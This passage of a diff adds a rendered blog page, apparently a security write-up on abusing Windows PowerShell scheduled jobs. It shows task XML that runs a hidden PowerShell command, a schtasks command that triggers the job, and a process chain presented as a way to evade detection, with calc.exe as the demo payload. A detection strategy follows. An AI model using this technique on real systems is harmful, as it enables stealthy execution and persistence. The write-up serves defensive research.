+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;URI&gt;</span>\Microsoft\Windows\PowerShell\ScheduledJobs\shark-job-testing-1<span class="nt">&lt;/URI&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;SecurityDescriptor&gt;</span>D:P(A;;GA;;;SY)(A;;GA;;;BA)(A;;GA;;;S-1-5-21-1046022866-1716163381-3209723860-1001)<span class="nt">&lt;/SecurityDescriptor&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/RegistrationInfo&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Triggers&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;TimeTrigger</span> <span class="na">id=</span><span class="s">&#34;1&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;StartBoundary&gt;</span>2026-08-21T11:18:28<span class="nt">&lt;/StartBoundary&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;Enabled&gt;</span>true<span class="nt">&lt;/Enabled&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;RandomDelay&gt;</span>P0DT0H0M0S<span class="nt">&lt;/RandomDelay&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/TimeTrigger&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/Triggers&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Settings&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;MultipleInstancesPolicy&gt;</span>IgnoreNew<span class="nt">&lt;/MultipleInstancesPolicy&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;DisallowStartIfOnBatteries&gt;</span>true<span class="nt">&lt;/DisallowStartIfOnBatteries&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;StopIfGoingOnBatteries&gt;</span>true<span class="nt">&lt;/StopIfGoingOnBatteries&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;AllowHardTerminate&gt;</span>true<span class="nt">&lt;/AllowHardTerminate&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;StartWhenAvailable&gt;</span>false<span class="nt">&lt;/StartWhenAvailable&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;RunOnlyIfNetworkAvailable&gt;</span>false<span class="nt">&lt;/RunOnlyIfNetworkAvailable&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;IdleSettings&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;Duration&gt;</span>P0DT0H10M0S<span class="nt">&lt;/Duration&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;WaitTimeout&gt;</span>P0DT1H0M0S<span class="nt">&lt;/WaitTimeout&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;StopOnIdleEnd&gt;</span>false<span class="nt">&lt;/StopOnIdleEnd&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;RestartOnIdle&gt;</span>false<span class="nt">&lt;/RestartOnIdle&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/IdleSettings&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;AllowStartOnDemand&gt;</span>true<span class="nt">&lt;/AllowStartOnDemand&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Enabled&gt;</span>true<span class="nt">&lt;/Enabled&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Hidden&gt;</span>false<span class="nt">&lt;/Hidden&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;RunOnlyIfIdle&gt;</span>false<span class="nt">&lt;/RunOnlyIfIdle&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;WakeToRun&gt;</span>false<span class="nt">&lt;/WakeToRun&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;ExecutionTimeLimit&gt;</span>PT72H<span class="nt">&lt;/ExecutionTimeLimit&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Priority&gt;</span>7<span class="nt">&lt;/Priority&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/Settings&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Actions</span> <span class="na">Context=</span><span class="s">&#34;Author&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Exec</span> <span class="na">id=</span><span class="s">&#34;StartPowerShellJob&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;Command&gt;</span>powershell.exe<span class="nt">&lt;/Command&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;Arguments&gt;</span>-NoLogo -NonInteractive -WindowStyle Hidden -Command &#34;Import-Module PSScheduledJob; $jobDef = [Microsoft.PowerShell.ScheduledJob.ScheduledJobDefinition]::LoadFromStore(&#39;shark-job-testing-1&#39;, &#39;C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs&#39;); $jobDef.Run()&#34;<span class="nt">&lt;/Arguments&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/Exec&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/Actions&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Principals&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Principal</span> <span class="na">id=</span><span class="s">&#34;Author&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;UserId&gt;</span>SH4RK\shark<span class="nt">&lt;/UserId&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;LogonType&gt;</span>S4U<span class="nt">&lt;/LogonType&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;RunLevel&gt;</span>LeastPrivilege<span class="nt">&lt;/RunLevel&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/Principal&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/Principals&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/Task&gt;</span>
+</span></span></code></pre></div><h4 id="actual-command-exeuction">Actual Command Exeuction</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">  <span class="nt">&lt;Actions</span> <span class="na">Context=</span><span class="s">&#34;Author&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;Exec</span> <span class="na">id=</span><span class="s">&#34;StartPowerShellJob&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;Command&gt;</span>powershell.exe<span class="nt">&lt;/Command&gt;</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&lt;Arguments&gt;</span>-NoLogo -NonInteractive -WindowStyle Hidden -Command &#34;Import-Module PSScheduledJob; $jobDef = [Microsoft.PowerShell.ScheduledJob.ScheduledJobDefinition]::LoadFromStore(&#39;shark-job-testing-1&#39;, &#39;C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs&#39;); $jobDef.Run()&#34;<span class="nt">&lt;/Arguments&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/Exec&gt;</span>
+</span></span></code></pre></div><p>Querying via schtasks</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Folder: <span class="se">\M</span>icrosoft<span class="se">\W</span>indows<span class="se">\P</span>owerShell<span class="se">\S</span>cheduledJobs
+</span></span><span class="line"><span class="cl">TaskName                                 Next Run Time          <span class="nv">Status</span>
+</span></span><span class="line"><span class="cl"><span class="o">========================================</span> <span class="o">======================</span> <span class="o">===============</span>
+</span></span><span class="line"><span class="cl">shark-job-testing-1                      N/A                    Ready
+</span></span></code></pre></div><h5 id="running-it-via-schtasks">Running it via schtasks</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> schtasks /run /tn <span class="s2">&#34;\Microsoft\Windows\PowerShell\ScheduledJobs\shark-job-testing-1&#34;</span>
+</span></span><span class="line"><span class="cl">SUCCESS: Attempted to run the scheduled task <span class="s2">&#34;\Microsoft\Windows\PowerShell\ScheduledJobs\shark-job-testing-1&#34;</span>.
+</span></span></code></pre></div><p>This will go and check the corresponding XML, load it, and execute the command. To proxy all the malicious executions, we can target the pre-existing task and abuse it.</p>
+<p>From the process execution chain, it looks like this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">+-------------+     +---------------+       +---------------+     +------------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> svchost.exe <span class="p">|</span> -&gt;  <span class="p">|</span> powershell.exe <span class="p">|</span> -&gt;   <span class="p">|</span> powershell.exe <span class="p">|</span> -&gt; <span class="p">|</span> malicious command/binary execution  <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-------------+     +---------------+       +---------------+     +------------------------------------+
+</span></span></code></pre></div><p>One of the coolest ways to evade detection is execution via <code>schtasks.exe</code>. Since the target binary is not executing directly from <code>svchost.exe</code> (which runs with the <code>-k netsvc -p -s Schedule</code> arguments), it originates from lolbin process instead which would be less suspicious.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">- Svchost.exe -&gt; runs with -s Schedule 
+</span></span><span class="line"><span class="cl">- powershell.exe -&gt; runs <span class="sb">`</span>Import-Module PSScheduledJob.... <span class="nv">$jobDef</span>.Run<span class="o">()</span><span class="sb">`</span>
+</span></span><span class="line"><span class="cl">- powershell.exe -&gt; runs <span class="sb">`</span><span class="s2">&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#34;</span> -Version 5.1 -s -NoLogo -NoProfile<span class="sb">`</span>
+</span></span><span class="line"><span class="cl">- calc.exe 
+</span></span></code></pre></div><h4 id="detection-strategy">Detection Strategy</h4>
+<ul>
+<li>Check for the modification of the configuration file i.e. <code>ScheduledJobDefinition.xml</code>.</li>
+<li>Review the child process powershell.exe (running with flag <code>Import-Module PSScheduledJob.... $jobDef.Run()</code>)</li>
+<li>Analyze Sytem32\Tasks\Microsoft\Windows\PowerShell\ScheduledJobs folder</li>
+<li>Review the XML file to obtain the acutal command.</li>
+<li>If tasks are deleted, check for the <code>Microsoft-Windows-TaskScheduler/Operational</code> event ids (i.e. 100, 102, 129, 201, 202)</li>
+</ul>
+</section></main>
+        <footer id="main-footer"><div class="footer">
+  <a href="#">Scroll to Top</a>
+  <div class="footer-copyright">
+    <div class="dim">© 2026 </div>
+    <div>Made with ❤️ and powered by <a href="https://github.com/math-queiroz/rusty-typewriter" target="_blank">Rusty Typewriter</a> theme for <a href="https://gohugo.io/" target="_blank">Hugo</a></div>
+  </div>
+</div>
+</footer>
+      </div><a id="aside-toggle-button" href="#">
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640" fill="currentColor">
+<path d="M169.4 297.4C156.9 309.9 156.9 330.2 169.4 342.7L361.4 534.7C373.9 547.2 394.2 547.2 406.7 534.7C419.2 522.2 419.2 501.9 406.7 489.4L237.3 320L406.6 150.6C419.1 138.1 419.1 117.8 406.6 105.3C394.1 92.8 373.8 92.8 361.3 105.3L169.3 297.3z"/>
+</svg>
+</a>
+  <aside id="side-pane" class="side-sticky">
+<div class="side-details">
+    <span>2019 words</span>
+    <span>25 - 32 minutes read</span></div><h3>Table Of Contents</h3><nav id="TableOfContents">
+  <ul>
+    <li><a href="#windows-scheduled-job">Windows Scheduled Job</a>
+      <ul>
+        <li><a href="#intrinsic-of-scheduledjob">Intrinsic of ScheduledJob</a></li>
+        <li><a href="#potential-abuse">Potential Abuse</a></li>
+        <li><a href="#interesting-findings">Interesting Findings</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></aside></div>
+  </div>
+</body>
+</html>
